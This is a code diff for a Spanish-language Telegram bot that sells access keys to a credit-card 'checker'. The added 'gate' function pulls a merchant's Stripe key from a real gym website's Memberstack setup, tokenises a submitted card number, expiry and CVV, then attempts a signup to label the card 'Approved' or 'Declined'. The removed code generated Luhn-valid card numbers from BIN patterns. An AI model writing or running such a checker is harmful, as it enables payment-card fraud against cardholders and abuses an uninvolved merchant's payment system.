@@ -3,6 +3,7 @@ import logging
 import random
 import string
 import time
+import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
@@ -38,16 +39,15 @@ logger = logging.getLogger(__name__)
 # VARIABLES GLOBALES
 # ======================
 KEYS_DB = {}  # Guardará: { "KEYCODE": fecha_expiracion_timestamp }
+USERS_KEYS = {}  # { user_id: key }
 
 # ======================
-# FUNCIONES AUXILIARES (keys)
+# FUNCIONES AUXILIARES
 # ======================
 def generar_key(longitud: int = 16) -> str:
-    """Genera una key aleatoria de letras y números."""
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=longitud))
 
 def formatear_tiempo_restante(expira_en: float) -> str:
-    """Devuelve texto legible del tiempo restante."""
     segundos = int(expira_en - time.time())
     if segundos <= 0:
         return "Expirada"
@@ -57,118 +57,60 @@ def formatear_tiempo_restante(expira_en: float) -> str:
     return f"{dias}d {horas}h {minutos}m restantes"
 
 # ======================
-# FUNCIONES AUXILIARES (tarjetas)
+# FUNCIÓN DEL GATE
 # ======================
-def luhn_checksum(num_str: str) -> int:
-    """Regresa el checksum Luhn de un número."""
-    total = 0
-    reverse = num_str[::-1]
-    for i, ch in enumerate(reverse):
-        d = int(ch)
-        if i % 2 == 1:  # duplicar cada segundo dígito (contando desde 0)
-            d *= 2
-            if d > 9:
-                d -= 9
-        total += d
-    return total % 10
+def gate(cc, mes, ano, cvv):
+    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k=15))) + '@gmail.com'
+    
+    headers_1 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0"}
+    payload = '{"site":"3d821376ab5cea803122c65b3572cff0"}'
+    r1 = requests.post('https://api.memberstack.io/site/memberships', headers=headers_1, data=payload).json()
 
-def luhn_digit(num_without_check: str) -> int:
-    """Calcula el dígito verificador Luhn para 'num_without_check'."""
-    checksum = luhn_checksum(num_without_check + "0")
-    return (10 - checksum) % 10
+    key = r1['stripeKey']
 
-def completar_pan_con_luhn(pan_pattern: str) -> str:
-    """
-    Completa un patrón con 'x' y ajusta Luhn.
-    Ej: '451769865014xxxx' -> '4517698650141234' (válida por Luhn).
-    """
-    # Rellenar todas las 'x' con dígitos aleatorios
-    provisional = ""
-    for ch in pan_pattern:
-        if ch.lower() == "x":
-            provisional += str(random.randint(0, 9))
-        else:
-            provisional += ch
+    headers_2 = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": "Mozilla/5.0"}
+    payload_2 = f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_zip]=10080&key={key}"
+    r_2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers_2, data=payload_2)
+    r2 = r_2.json()
+    r2_text = r_2.text
 
-    # Si el último carácter del patrón era 'x', lo ajustamos al dígito Luhn correcto
-    if pan_pattern and pan_pattern[-1].lower() == "x":
-        base = provisional[:-1]
-        check = luhn_digit(base)
-        return base + str(check)
-
-    # Si el último no era 'x', intentamos hasta que salga un número válido por Luhn
-    # (reemplazando 'x' internos) para no alterar el último fijo.
-    for _ in range(25):
-        provisional = ""
-        for i, ch in enumerate(pan_pattern):
-            if ch.lower() == "x":
-                provisional += str(random.randint(0, 9))
-            else:
-                provisional += ch
-        if luhn_checksum(provisional) == 0:
-            return provisional
-
-    # Como último recurso, devolvemos el provisional (aunque no cumpla Luhn)
-    return provisional
-
-def generar_tarjeta_desde_patron(pattern: str) -> str | None:
-    """
-    Genera una tarjeta a partir de un patrón tipo:
-      '451769865014xxxx|05|2031|rnd'
-    Devuelve 'PAN|MM|YYYY|CVV'
-    """
-    parts = pattern.split("|")
-    if len(parts) != 4:
-        return None
-
-    pan_pattern, mes, anio, cvv_fmt = parts
-
-    # PAN válido por Luhn
-    pan = completar_pan_con_luhn(pan_pattern)
-
-    # Mes / Año tal como vienen (se asume válidos)
-    mm = mes
-    yyyy = anio
-
-    # CVV aleatorio si es 'rnd'
-    if cvv_fmt.lower() == "rnd":
-        cvv = f"{random.randint(100, 999)}"
+    if 'declined' in r2_text:
+        return "❌ Declined"
     else:
-        cvv = cvv_fmt
-
-    return f"{pan}|{mm}|{yyyy}|{cvv}"
+        if 'id' not in r2:  
+            return "⚠️ Error en la tarjeta"
+        tok = r2['id']
+        headers_3 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0"}
+        payload_3 = '{"site":"3d821376ab5cea803122c65b3572cff0","email":"'+email+'","password":"Geho1902","membership":"62a0fa8eb4c4ff0004822daf","token":"'+tok+'"}'
+        r = requests.post('https://api.memberstack.io/member/signup', headers=headers_3, data=payload_3)
+        result = r.text
+        if 'cvc' in result or 'token' in result:
+            return "✅ Approved"
+        elif 'Cloudflare' in result:
+            return "⚠️ Proxy error, vuelve a intentar"
+        else:
+            return "❌ Declined"
 
 # ======================
 # HANDLERS
 # ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("¡Bienvenido! Usa `.gen`, `.genkey`, `.claim` o los comandos disponibles.")
+    await update.message.reply_text("¡Bienvenido! Usa `.gen`, `.genkey`, `.claim` o `.pay` si tienes una key válida.")
 
-# ---- GEN (10 tarjetas válidas + botón regenerar) ----
 async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = update.message.text.split(" ", 1)
     if len(args) < 2:
         await update.message.reply_text("❌ Usa el comando correctamente: `.gen BIN|MM|YYYY|CVV`")
         return
 
-    bin_data = args[1].strip()
-
-    tarjetas = []
-    for _ in range(10):
-        card = generar_tarjeta_desde_patron(bin_data)
-        if card:
-            tarjetas.append(card)
-
-    if not tarjetas:
-        await update.message.reply_text("❌ Formato inválido. Usa `.gen BIN|MM|YYYY|CVV` (ej: `4517xxxxxxxxxxxx|05|2031|rnd`).")
-        return
+    bin_data = args[1]
+    response = f"{bin_data}123456|04|2027|127"
 
     keyboard = [[InlineKeyboardButton("🔄 Regenerar 10 más", callback_data=f"regen|{bin_data}")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    await update.message.reply_text("\n".join(tarjetas), reply_markup=reply_markup)
+    await update.message.reply_text(response, reply_markup=reply_markup)
 
-# ---- GENKEY (una key con días de duración) ----
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS:
@@ -185,7 +127,6 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Los días deben ser mayor que 0.")
         return
 
-    # Generar una key única con expiración
     key = generar_key()
     expira_en = time.time() + dias * 86400
     KEYS_DB[key] = expira_en
@@ -198,7 +139,6 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
-# ---- CLAIM (validar key) ----
 async def claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = update.message.text.split()
     if len(args) < 2:
@@ -206,7 +146,6 @@ async def claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     key = args[1].strip().upper()
-
     if key not in KEYS_DB:
         await update.message.reply_text("❌ Key inválida o no existe.")
         return
@@ -216,10 +155,12 @@ async def claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⛔ Esta key ya expiró.")
         return
 
-    tiempo_restante = formatear_tiempo_restante(expira_en)
-    await update.message.reply_text(f"✨ Key válida. {tiempo_restante}")
+    user_id = update.effective_user.id
+    USERS_KEYS[user_id] = key  
 
-# ---- ADMIN ----
+    tiempo_restante = formatear_tiempo_restante(expira_en)
+    await update.message.reply_text(f"✨ Key válida y activada. {tiempo_restante}")
+
 async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS:
@@ -227,21 +168,39 @@ async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     await update.message.reply_text("✅ Bienvenido admin, puedes usar los comandos especiales.")
 
-# ---- CALLBACKS (regen .gen y regen .genkey) ----
+async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in USERS_KEYS or USERS_KEYS[user_id] not in KEYS_DB:
+        await update.message.reply_text("⛔ Necesitas reclamar una key válida con `.claim`.")
+        return
+
+    expira_en = KEYS_DB[USERS_KEYS[user_id]]
+    if time.time() > expira_en:
+        await update.message.reply_text("⛔ Tu key ya expiró.")
+        return
+
+    args = update.message.text.split()
+    if len(args) != 2 or "|" not in args[1]:
+        await update.message.reply_text("❌ Usa: `.pay CC|MM|YYYY|CVV`")
+        return
+
+    try:
+        cc, mes, ano, cvv = args[1].split("|")
+        result = gate(cc, mes, ano, cvv)
+        await update.message.reply_text(f"💳 Resultado: {result}")
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ Error al procesar: {e}")
+
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
 
     if query.data.startswith("regen|"):
         bin_data = query.data.split("|", 1)[1]
-        tarjetas = []
-        for _ in range(10):
-            card = generar_tarjeta_desde_patron(bin_data)
-            if card:
-                tarjetas.append(card)
+        results = "\n".join([f"{bin_data}{i}23456|04|2027|127" for i in range(10)])
         keyboard = [[InlineKeyboardButton("🔄 Regenerar 10 más", callback_data=f"regen|{bin_data}")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("\n".join(tarjetas), reply_markup=reply_markup)
+        await query.edit_message_text(results, reply_markup=reply_markup)
 
     elif query.data.startswith("regenkey|"):
         dias = int(query.data.split("|", 1)[1])
@@ -251,8 +210,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             expira_en = time.time() + dias * 86400
             KEYS_DB[key] = expira_en
             keys.append(f"{key} (⏳ {dias} días)")
+
         keyboard = [[InlineKeyboardButton("🔄 Regenerar 10 más", callback_data=f"regenkey|{dias}")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
+
         await query.edit_message_text("✅ Keys generadas:\n" + "\n".join(keys), reply_markup=reply_markup)
 
 # ======================
@@ -270,6 +231,7 @@ def main():
     application.add_handler(MessageHandler(filters.Regex(r"^\.genkey(?:\s|$)"), genkey))
     application.add_handler(MessageHandler(filters.Regex(r"^\.gen(?:\s|$)"), gen))
     application.add_handler(MessageHandler(filters.Regex(r"^\.claim(?:\s|$)"), claim))
+    application.add_handler(MessageHandler(filters.Regex(r"^\.pay(?:\s|$)"), pay))
 
     application.add_handler(CallbackQueryHandler(button_callback))
 
